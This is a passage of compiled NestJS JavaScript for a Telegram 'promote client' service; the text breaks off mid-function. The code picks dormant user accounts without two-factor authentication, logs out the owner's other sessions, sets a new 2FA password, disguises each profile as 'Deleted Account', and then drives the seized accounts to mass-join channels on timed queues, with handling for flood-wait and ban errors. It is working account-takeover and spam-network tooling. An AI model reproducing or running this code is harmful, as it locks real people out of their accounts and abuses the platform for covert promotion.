"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var PromoteClientService_1;
Object.defineProperty(exports, "__esModule", { value: true });
exports.PromoteClientService = void 0;
const channels_service_1 = require("../channels/channels.service");
const common_1 = require("@nestjs/common");
const mongoose_1 = require("@nestjs/mongoose");
const mongoose_2 = require("mongoose");
const promote_client_schema_1 = require("./schemas/promote-client.schema");
const Telegram_service_1 = require("../Telegram/Telegram.service");
const Helpers_1 = require("telegram/Helpers");
const users_service_1 = require("../users/users.service");
const active_channels_service_1 = require("../active-channels/active-channels.service");
const client_service_1 = require("../clients/client.service");
const buffer_client_service_1 = require("../buffer-clients/buffer-client.service");
const parseError_1 = require("../../utils/parseError");
const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
const logbots_1 = require("../../utils/logbots");
const connection_manager_1 = require("../Telegram/utils/connection-manager");
const session_manager_1 = require("../session-manager");
let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
    constructor(promoteClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, bufferClientService, sessionService) {
        this.promoteClientModel = promoteClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.bufferClientService = bufferClientService;
        this.sessionService = sessionService;
        this.logger = new common_1.Logger(PromoteClientService_1.name);
        this.joinChannelMap = new Map();
        this.leaveChannelMap = new Map();
        this.isLeaveChannelProcessing = false;
        this.isJoinChannelProcessing = false;
        this.JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000;
        this.LEAVE_CHANNEL_INTERVAL = 60 * 1000;
        this.LEAVE_CHANNEL_BATCH_SIZE = 10;
        this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER = 10;
        this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT = 16;
    }
    async create(promoteClient) {
        const promoteClientData = {
            ...promoteClient,
            status: promoteClient.status || 'active',
            message: promoteClient.message || 'Account is functioning properly'
        };
        const newUser = new this.promoteClientModel(promoteClientData);
        return newUser.save();
    }
    async findAll(statusFilter) {
        const filter = statusFilter ? { status: statusFilter } : {};
        return this.promoteClientModel.find(filter).exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.promoteClientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, returnDocument: 'after' }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async updateStatus(mobile, status, message) {
        const updateData = { status };
        if (message) {
            updateData.message = message;
        }
        return this.update(mobile, updateData);
    }
    async updateLastUsed(mobile) {
        return this.update(mobile, { lastUsed: new Date() });
    }
    async markAsUsed(mobile, message) {
        const updateData = { lastUsed: new Date() };
        if (message) {
            updateData.message = message;
        }
        return this.update(mobile, updateData);
    }
    async markAsInactive(mobile, reason) {
        return this.updateStatus(mobile, 'inactive', reason);
    }
    async markAsActive(mobile, message = 'Account is functioning properly') {
        return this.updateStatus(mobile, 'active', message);
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            this.logger.debug("Updating existing promote client");
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            this.logger.debug("Creating new promote client");
            return this.create(createOrUpdateUserDto);
        }
    }
    async remove(mobile) {
        try {
            this.logger.log(`Removing PromoteClient with mobile: ${mobile}`);
            const deleteResult = await this.promoteClientModel.deleteOne({ mobile }).exec();
            if (deleteResult.deletedCount === 0) {
                throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
            }
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);
        }
        catch (error) {
            if (error instanceof common_1.NotFoundException) {
                throw error;
            }
            const errorDetails = (0, parseError_1.parseError)(error);
            this.logger.error(`Error removing PromoteClient with mobile ${mobile}: ${errorDetails.message}`);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        this.logger.log(`PromoteClient with mobile ${mobile} removed successfully`);
    }
    async search(filter) {
        this.logger.debug(`Search filter: ${JSON.stringify(filter)}`);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        this.logger.debug(`Modified filter: ${JSON.stringify(filter)}`);
        return this.promoteClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.promoteClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromPromoteMap(key) {
        this.joinChannelMap.delete(key);
    }
    clearPromoteMap() {
        this.logger.debug("PromoteMap cleared");
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
    }
    async updateInfo() {
        const clients = await this.promoteClientModel.find({
            status: 'active'
        }).sort({ channels: 1 });
        for (const client of clients) {
            const mobile = client.mobile;
            try {
                this.logger.debug(`Updating info for client: ${mobile}`);
                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                const channels = await telegramClient.channelInfo(true);
                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
                await this.update(mobile, { channels: channels.ids.length });
                await connection_manager_1.connectionManager.unregisterClient(mobile);
                await (0, Helpers_1.sleep)(2000);
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                await this.markAsInactive(mobile, `${errorDetails.message}`);
                this.logger.error(`Error updating info for client ${client.mobile}:`, errorDetails);
            }
        }
    }
    async joinchannelForPromoteClients(skipExisting = true) {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Active client setup exists, skipping promotion process');
            return 'Active client setup exists, skipping promotion';
        }
        this.logger.log('Starting join channel process');
        this.joinChannelMap.clear();
        this.leaveChannelMap.clear();
        this.clearJoinChannelInterval();
        this.clearLeaveChannelInterval();
        await (0, Helpers_1.sleep)(2000);
        try {
            const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
            const clients = await this.promoteClientModel.find({
                channels: { $lt: 350 },
                mobile: { $nin: existingKeys },
                status: 'active'
            }).sort({ channels: 1 }).limit(8);
            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);
            const joinSet = new Set();
            const leaveSet = new Set();
            let successCount = 0;
            let failCount = 0;
            for (const document of clients) {
                const mobile = document.mobile;
                this.logger.debug(`Processing client: ${mobile}`);
                try {
                    const client = await connection_manager_1.connectionManager.getClient(mobile, {
                        autoDisconnect: false,
                        handler: false
                    });
                    const channels = await client.channelInfo(true);
                    this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
                    await this.update(mobile, { channels: channels.ids.length });
                    if (channels.canSendFalseCount < 10) {
                        const excludedIds = channels.ids;
                        const channelLimit = 150;
                        const result = channels.ids.length < 220
                            ? await this.channelsService.getActiveChannels(channelLimit, 0, excludedIds)
                            : await this.activeChannelsService.getActiveChannels(channelLimit, 0, excludedIds);
                        if (!this.joinChannelMap.has(mobile)) {
                            this.joinChannelMap.set(mobile, result);
                            joinSet.add(mobile);
                        }
                        else {
                            this.logger.debug(`${mobile}: Already in join queue, skipping re-add`);
                        }
                    }
                    else {
                        this.logger.debug(`${mobile}: Too many blocked channels (${channels.canSendFalseCount}), preparing for leave`);
                        if (!this.leaveChannelMap.has(mobile)) {
                            this.leaveChannelMap.set(mobile, channels.canSendFalseChats);
                            leaveSet.add(mobile);
                        }
                        else {
                            this.logger.debug(`${mobile}: Already in leave queue, skipping re-add`);
                        }
                    }
                    successCount++;
                }
                catch (error) {
                    failCount++;
                    const errorDetails = (0, parseError_1.parseError)(error);
                    this.logger.error(`Error processing client ${mobile}:`, errorDetails);
                    const errorMsg = error?.errorMessage || errorDetails?.message || 'Unknown error';
                    const isFatalSessionError = [
                        "SESSION_REVOKED",
                        "AUTH_KEY_UNREGISTERED",
                        "USER_DEACTIVATED",
                        "USER_DEACTIVATED_BAN",
                        "FROZEN_METHOD_INVALID"
                    ].includes(errorMsg);
                    if (isFatalSessionError) {
                        this.logger.warn(`${mobile}: Fatal session error (${errorMsg}), marking as inactive and removing`);
                        try {
                            await this.markAsInactive(mobile, `Session error: ${errorMsg}`);
                        }
                        catch (statusUpdateError) {
                            this.logger.error(`Failed to update status for ${mobile}:`, statusUpdateError);
                        }
                        await this.remove(mobile);
                    }
                    else {
                        this.logger.warn(`${mobile}: Non-fatal error encountered, will retry later`);
                    }
                }
                finally {
                    connection_manager_1.connectionManager.unregisterClient(mobile);
                    await (0, Helpers_1.sleep)(2000);
                }
            }
            if (joinSet.size > 0) {
                this.logger.debug(`Starting join queue for ${joinSet.size} clients`);
                this.joinChannelQueue();
            }
            if (leaveSet.size > 0) {
                this.logger.debug(`Starting leave queue for ${leaveSet.size} clients`);
                this.leaveChannelQueue();
            }
            this.logger.log(`Join channel process completed for ${clients.length} clients`);
            return `Initiated Joining channels for ${joinSet.size} | Queued for leave: ${leaveSet.size}`;
        }
        catch (error) {
            this.logger.error('Unexpected error during joinchannelForPromoteClients:', error);
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            throw new Error('Failed to initiate channel joining process');
        }
    }
    async joinChannelQueue() {
        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {
            this.logger.warn('Join channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, skipping queue');
            return;
        }
        this.isJoinChannelProcessing = true;
        this.joinChannelIntervalId = setInterval(async () => {
            let processTimeout;
            try {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.log('Join channel map is empty, clearing interval');
                    this.clearJoinChannelInterval();
                    return;
                }
                processTimeout = setTimeout(() => {
                    this.logger.error('Join channel interval processing timeout');
                    this.clearJoinChannelInterval();
                }, this.JOIN_CHANNEL_INTERVAL - 1000);
                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);
                for (const mobile of keys) {
                    let currentChannel = null;
                    try {
                        const channels = this.joinChannelMap.get(mobile);
                        if (!channels || channels.length === 0) {
                            this.logger.debug(`No more channels to join for ${mobile}, removing from map`);
                            this.removeFromPromoteMap(mobile);
                            continue;
                        }
                        currentChannel = channels.shift();
                        if (channels.length > 0) {
                            this.logger.debug(`${mobile}: Pending channels to join: ${channels.length}`);
                            this.joinChannelMap.set(mobile, channels);
                        }
                        else {
                            this.removeFromPromoteMap(mobile);
                        }
                        await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile}: Attempting to join channel: @${currentChannel.username}`);
                        await this.telegramService.tryJoiningChannel(mobile, currentChannel);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} @${currentChannel?.username || 'unknown'} Outer Err ERR: `, false);
                        this.logger.error(`${mobile}: Error joining @${currentChannel?.username || 'unknown'}:`, errorDetails);
                        const errorMsg = error.errorMessage || error.message;
                        if (errorDetails.error === 'FloodWaitError' || errorMsg === 'CHANNELS_TOO_MUCH') {
                            this.logger.warn(`${mobile}: FloodWaitError or too many channels, handling...`);
                            this.removeFromPromoteMap(mobile);
                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                            await this.update(mobile, { channels: channelsInfo.ids.length });
                        }
                        if (errorMsg === "SESSION_REVOKED" ||
                            errorMsg === "AUTH_KEY_UNREGISTERED" ||
                            errorMsg === "USER_DEACTIVATED" ||
                            errorMsg === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${mobile}, marking as inactive and removing client`);
                            try {
                                await this.markAsInactive(mobile, `Session error: ${errorMsg}`);
                            }
                            catch (statusUpdateError) {
                                this.logger.error(`Failed to update status for ${mobile}:`, statusUpdateError);
                            }
                            await this.remove(mobile);
                        }
                    }
                    finally {
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                }
            }
            catch (error) {
                this.logger.error('Error in join channel interval', error);
                this.clearJoinChannelInterval();
            }
            finally {
                if (processTimeout) {
                    clearTimeout(processTimeout);
                }
            }
        }, this.JOIN_CHANNEL_INTERVAL);
        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            this.isJoinChannelProcessing = false;
            if (this.joinChannelMap.size > 0) {
                setTimeout(() => {
                    this.logger.debug('Triggering next join channel process');
                    this.joinchannelForPromoteClients(false);
                }, 30000);
            }
        }
    }
    removeFromLeaveMap(key) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }
    clearLeaveMap() {
        this.logger.debug("LeaveMap cleared");
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
    }
    async leaveChannelQueue() {
        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {
            this.logger.warn('Leave channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }
        this.isLeaveChannelProcessing = true;
        this.leaveChannelIntervalId = setInterval(async () => {
            let processTimeout;
            try {
                const keys = Array.from(this.leaveChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.debug('Leave map is empty, clearing interval');
                    this.clearLeaveChannelInterval();
                    return;
                }
                processTimeout = setTimeout(() => {
                    this.logger.error('Leave channel interval processing timeout');
                    this.clearLeaveChannelInterval();
                }, this.LEAVE_CHANNEL_INTERVAL - 1000);
                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);
                for (const mobile of keys) {
                    try {
                        this.logger.debug(`Processing leave channels for mobile: ${mobile}`);
                        const channels = this.leaveChannelMap.get(mobile);
                        if (!channels || channels.length === 0) {
                            this.logger.debug(`No channels to leave for mobile: ${mobile}`);
                            this.removeFromLeaveMap(mobile);
                            continue;
                        }
                        const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                        if (channels.length > 0) {
                            this.logger.debug(`${mobile}: Processing ${channelsToProcess.length} channels, ${channels.length} remaining`);
                            this.leaveChannelMap.set(mobile, channels);
                        }
                        else {
                            this.removeFromLeaveMap(mobile);
                        }
                        const client = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile}: Attempting to leave ${channelsToProcess.length} channels`);
                        await client.leaveChannels(channelsToProcess);
                        this.logger.debug(`${mobile}: Successfully left ${channelsToProcess.length} channels`);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error);
                        this.logger.error(`Error in leave channel process for ${mobile}:`, errorDetails);
                        if (errorDetails.message === "SESSION_REVOKED" ||
                            errorDetails.message === "AUTH_KEY_UNREGISTERED" ||
                            errorDetails.message === "USER_DEACTIVATED" ||
                            errorDetails.message === "USER_DEACTIVATED_BAN") {
                            this.logger.warn(`${mobile}: Session invalid, removing client`);
                            await this.remove(mobile);
                            this.removeFromLeaveMap(mobile);
                        }
                    }
                    finally {
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                }
            }
            catch (error) {
                this.logger.error('Error in leave channel interval', error);
                this.clearLeaveChannelInterval();
            }
            finally {
                if (processTimeout) {
                    clearTimeout(processTimeout);
                }
            }
        }, this.LEAVE_CHANNEL_INTERVAL);
        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);
    }
    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }
    async setAsPromoteClient(mobile, availableDate = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]) {
        const user = (await this.usersService.search({ mobile, expired: false }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('PromoteClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const existingAssignment = await this.promoteClientModel.findOne({
            mobile,
            clientId: { $exists: true }
        });
        if (!clientMobiles.includes(mobile) && !existingAssignment) {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false });
            try {
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true);
                const promoteClient = {
                    tgId: user.tgId,
                    lastActive: "default",
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                    status: 'active',
                    message: 'Manually configured as promote client',
                    lastUsed: null
                };
                await this.promoteClientModel.findOneAndUpdate({ mobile: user.mobile }, { $set: promoteClient }, { new: true, upsert: true }).exec();
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, errorDetails.status);
            }
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            return "Client set as promote successfully";
        }
        else {
            throw new common_1.BadRequestException("Number is a Active Client");
        }
    }
    async checkPromoteClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            const clients = await this.clientService.findAll();
            const bufferClients = await this.bufferClientService.findAll();
            const clientMainMobiles = clients.map(c => c.mobile);
            const bufferClientIds = bufferClients.map(c => c.mobile);
            const assignedPromoteMobiles = await this.promoteClientModel
                .find({ clientId: { $exists: true }, status: 'active' })
                .distinct('mobile');
            const goodIds = [...clientMainMobiles, ...bufferClientIds, ...assignedPromoteMobiles].filter(Boolean);
            const promoteClientsPerClient = new Map();
            const clientNeedingPromoteClients = [];
            const promoteClientCounts = await this.promoteClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active'
                    }
                },
                {
                    $group: {
                        _id: '$clientId',
                        count: { $sum: 1 }
                    }
                }
            ]);
            for (const result of promoteClientCounts) {
                promoteClientsPerClient.set(result._id, result.count);
            }
            for (const client of clients) {
                const assignedCount = promoteClientsPerClient.get(client.clientId) || 0;
                promoteClientsPerClient.set(client.clientId, assignedCount);
                const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - assignedCount);
                if (needed > 0) {
                    clientNeedingPromoteClients.push(client.clientId);
                }
            }
            let totalSlotsNeeded = 0;
            for (const clientId of clientNeedingPromoteClients) {
                if (totalSlotsNeeded >= this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER)
                    break;
                const assignedCount = promoteClientsPerClient.get(clientId) || 0;
                const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - assignedCount);
                const allocatedForThisClient = Math.min(needed, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER - totalSlotsNeeded);
                totalSlotsNeeded += allocatedForThisClient;
            }
            this.logger.debug(`Promote clients per client: ${JSON.stringify(Object.fromEntries(promoteClientsPerClient))}`);
            this.logger.debug(`Clients needing promote clients: ${clientNeedingPromoteClients.join(', ')}`);
            this.logger.debug(`Total slots needed: ${totalSlotsNeeded} (limited to max ${this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER} per trigger)`);
            const totalActivePromoteClients = await this.promoteClientModel.countDocuments({ status: 'active' });
            this.logger.debug(`Total active promote clients: ${totalActivePromoteClients}`);
            if (clientNeedingPromoteClients.length > 0 && totalSlotsNeeded > 0) {
                await this.addNewUserstoPromoteClients([], goodIds, clientNeedingPromoteClients, promoteClientsPerClient);
            }
            else {
                this.logger.debug('No new promote clients needed - all clients have sufficient promote clients');
            }
        }
        else {
            this.logger.warn("Ignored active check promote channels as active client setup exists");
        }
    }
    async addNewUserstoPromoteClients(badIds, goodIds, clientsNeedingPromoteClients = [], promoteClientsPerClient) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        let totalNeededFromClients = 0;
        for (const clientId of clientsNeedingPromoteClients) {
            let needed = 0;
            if (promoteClientsPerClient) {
                const currentCount = promoteClientsPerClient.get(clientId) || 0;
                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
            }
            else {
                const currentCount = await this.promoteClientModel.countDocuments({
                    clientId,
                    status: 'active'
                });
                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
            }
            totalNeededFromClients += needed;
        }
        const totalNeeded = Math.min(totalNeededFromClients, 10);
        if (totalNeeded === 0) {
            this.logger.debug('No promote clients needed - all clients have sufficient promote clients or limit reached');
            return;
        }
        this.logger.debug(`Limited to creating ${totalNeeded} new promote clients (max 10 per trigger)`);
        const documents = await this.usersService.executeQuery({
            mobile: { $nin: goodIds },
            expired: false,
            twoFA: false,
            lastActive: { $lt: sixMonthsAgo },
            totalChats: { $gt: 150 }
        }, { tgId: 1 }, totalNeeded + 5);
        this.logger.debug(`New promote documents to be added: ${documents.length} for ${clientsNeedingPromoteClients.length} clients needing promote clients (limited to ${totalNeeded})`);
        let processedCount = 0;
        const clientAssignmentTracker = new Map();
        for (const clientId of clientsNeedingPromoteClients) {
            let needed = 0;
            if (promoteClientsPerClient) {
                const currentCount = promoteClientsPerClient.get(clientId) || 0;
                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
            }
            else {
                const currentCount = await this.promoteClientModel.countDocuments({
                    clientId,
                    status: 'active'
                });
                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);
            }
            clientAssignmentTracker.set(clientId, needed);
        }
        while (processedCount < Math.min(totalNeeded, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER) && documents.length > 0 && clientsNeedingPromoteClients.length > 0) {
            const document = documents.shift();
            if (!document || !document.mobile || !document.tgId) {
                this.logger.warn('Invalid document found, skipping');
                continue;
            }
            let targetClientId = null;
            for (const clientId of clientsNeedingPromoteClients) {
                const needed = clientAssignmentTracker.get(clientId) || 0;
                if (needed > 0) {
                    targetClientId = clientId;
                    break;
                }
            }
            if (!targetClientId) {
                this.logger.debug('All clients have sufficient promote clients assigned');
                break;
            }
            try {
                const client = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: false });
                try {
                    const hasPassword = await client.hasPassword();
                    this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        this.logger.debug("Waiting for setting 2FA");
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        const channels = await client.channelInfo(true);
                        this.logger.debug(`Inserting Document for client ${targetClientId}`);
                        const promoteClient = {
                            tgId: document.tgId,
                            lastActive: "today",
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                            clientId: targetClientId,
                            status: 'active',
                            message: 'Account successfully configured as promote client',
                            lastUsed: null
                        };
                        await this.create(promoteClient);
                        try {
                            await this.usersService.update(document.tgId, { twoFA: true });
                        }
                        catch (userUpdateError) {
                            this.logger.warn(`Failed to update user 2FA status for ${document.mobile}:`, userUpdateError);
                        }
                        this.logger.log(`=============Created PromoteClient for ${targetClientId}==============`);
                    }
                    else {
                        this.logger.debug(`Failed to Update as PromoteClient as ${document.mobile} already has Password`);
                        try {
                            await this.usersService.update(document.tgId, { twoFA: true });
                        }
                        catch (userUpdateError) {
                            this.logger.warn(`Failed to update user 2FA status for ${document.mobile}:`, userUpdateError);
                        }
                    }
                    const currentNeeded = clientAssignmentTracker.get(targetClientId) || 0;
                    const newNeeded = Math.max(0, currentNeeded - 1);
                    clientAssignmentTracker.set(targetClientId, newNeeded);
                    if (newNeeded === 0) {
                        const index = clientsNeedingPromoteClients.indexOf(targetClientId);
                        if (index > -1) {
                            clientsNeedingPromoteClients.splice(index, 1);
                        }
                    }
                    this.logger.debug(`Client ${targetClientId}: ${newNeeded} more needed, ${totalNeeded - processedCount - 1} remaining in this batch`);
                    processedCount++;
                }
                catch (error) {
                    this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);
                    (0, parseError_1.parseError)(error);
                    processedCount++;
                }
                finally {
                    try {
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                    }
                    catch (unregisterError) {
                        this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);
                    }
                }
            }
            catch (error) {
                this.logger.error(`Error creating client connection for ${document.mobile}: ${error.message}`);
                (0, parseError_1.parseError)(error);
            }
        }
        this.logger.log(`✅ Batch completed: Created ${processedCount} new promote clients (max ${totalNeeded} per trigger)`);
        if (clientsNeedingPromoteClients.length > 0) {
            const stillNeeded = clientsNeedingPromoteClients.map(clientId => {
                const needed = clientAssignmentTracker.get(clientId) || 0;
                return `${clientId}:${needed}`;
            }).join(', ');
            this.logger.log(`⏳ Still needed in future triggers: ${stillNeeded}`);
        }
        else {
            this.logger.log(`🎉 All clients now have sufficient promote clients!`);
        }
        setTimeout(() => {
            this.joinchannelForPromoteClients();
        }, 2 * 60 * 1000);
    }
    async onModuleDestroy() {
        this.logger.log('Cleaning up PromoteClientService resources');
        this.clearPromoteMap();
        this.clearLeaveMap();
    }
    async getPromoteClientDistribution() {
        const clients = await this.clientService.findAll();
        const now = new Date();
        const last24Hours = new Date(now.getTime() - (24 * 60 * 60 * 1000));
        const [totalPromoteClients, unassignedPromoteClients, activePromoteClients, inactivePromoteClients, assignedCounts, activeCounts, inactiveCounts, neverUsedCounts, recentlyUsedCounts] = await Promise.all([
            this.promoteClientModel.countDocuments(),
            this.promoteClientModel.countDocuments({ clientId: { $exists: false } }),
            this.promoteClientModel.countDocuments({ status: 'active' }),
            this.promoteClientModel.countDocuments({ status: 'inactive' }),
            this.promoteClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null } } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } }
            ]),
            this.promoteClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null }, status: 'active' } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } }
            ]),
            this.promoteClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null }, status: 'inactive' } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } }
            ]),
            this.promoteClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active',
                        $or: [
                            { lastUsed: { $exists: false } },
                            { lastUsed: null }
                        ]
                    }
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } }
            ]),
            this.promoteClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active',
                        lastUsed: { $gte: last24Hours }
                    }
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } }
            ])
        ]);
        const assignedCountMap = new Map(assignedCounts.map((item) => [item._id, item.count]));
        const activeCountMap = new Map(activeCounts.map((item) => [item._id, item.count]));
        const inactiveCountMap = new Map(inactiveCounts.map((item) => [item._id, item.count]));
        const neverUsedCountMap = new Map(neverUsedCounts.map((item) => [item._id, item.count]));
        const recentlyUsedCountMap = new Map(recentlyUsedCounts.map((item) => [item._id, item.count]));
        const distributionPerClient = [];
        let clientsWithSufficient = 0;
        let clientsNeedingMore = 0;
        let totalNeeded = 0;
        for (const client of clients) {
            const assignedCount = assignedCountMap.get(client.clientId) || 0;
            const activeCount = activeCountMap.get(client.clientId) || 0;
            const inactiveCount = inactiveCountMap.get(client.clientId) || 0;
